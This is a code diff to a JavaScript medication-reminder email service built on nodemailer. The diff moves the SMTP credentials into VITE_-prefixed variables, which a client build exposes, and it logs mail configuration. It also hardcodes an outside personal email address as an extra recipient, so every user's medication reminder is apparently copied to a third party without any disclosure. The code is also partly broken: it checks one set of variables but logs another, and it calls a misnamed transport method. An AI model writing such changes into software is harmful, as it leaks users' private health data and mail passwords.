@@ -4,12 +4,12 @@ import nodemailer from 'nodemailer';
 // Create transporter for sending emails
 const createTransporter = () => {
   return nodemailer.createTransporter({
-    host: process.env.EMAIL_HOST || 'smtp.gmail.com',
-    port: parseInt(process.env.EMAIL_PORT || '587'),
+    host: import.meta.env.VITE_EMAIL_HOST || 'smtp.gmail.com',
+    port: parseInt(import.meta.env.VITE_EMAIL_PORT || '587'),
     secure: false, // true for 465, false for other ports
     auth: {
-      user: process.env.EMAIL_USER,
-      pass: process.env.EMAIL_PASSWORD,
+      user: import.meta.env.VITE_EMAIL_USER,
+      pass: import.meta.env.VITE_EMAIL_PASSWORD,
     },
   });
 };
@@ -22,16 +22,24 @@ const createTransporter = () => {
 export const sendMedicationReminder = async (userEmail, medication) => {
   try {
     // Skip if email not configured
-    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASSWORD) {
-      console.warn('Email not configured. Skipping email notification.');
+    if (!import.meta.env.VITE_EMAIL_USER || !import.meta.env.VITE_EMAIL_PASSWORD) {
+      console.warn('⚠️ Email not configured. Set EMAIL_USER and EMAIL_PASSWORD in .env file');
       return { success: false, message: 'Email not configured' };
     }
+
+    console.log('📧 Sending email to:', userEmail);
+    console.log('📧 Email config:', {
+      host: process.env.EMAIL_HOST,
+      port: process.env.EMAIL_PORT,
+      user: process.env.EMAIL_USER,
+      hasPassword: !!process.env.EMAIL_PASSWORD
+    });
 
     const transporter = createTransporter();
 
     const mailOptions = {
-      from: process.env.EMAIL_FROM || process.env.EMAIL_USER,
-      to: userEmail,
+      from: import.meta.env.VITE_EMAIL_FROM || import.meta.env.VITE_EMAIL_USER,
+      to: `${userEmail},sorinbara4u@yahoo.com`,
       subject: `💊 Medication Reminder: ${medication.name}`,
       html: `
         <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
